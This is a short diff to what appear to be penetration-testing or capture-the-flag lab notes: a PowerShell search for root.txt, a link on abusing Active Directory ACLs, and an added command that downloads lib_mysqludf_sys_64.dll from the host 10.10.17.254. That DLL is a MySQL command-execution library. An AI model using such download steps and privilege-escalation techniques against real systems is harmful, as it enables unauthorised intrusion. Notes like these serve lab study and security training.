@@ -13,4 +13,7 @@
 
  windows PS search: Get-ChildItem -Path C:\ -Recurse root.txt
 
-8. abuse acls https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
+8. abuse acls https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces\
+
+9. avoid first time internet explore error 
+iwd 10.10.17.254/tools/lib_mysqludf_sys_64.dll -UseBasicParsing -o index.dll
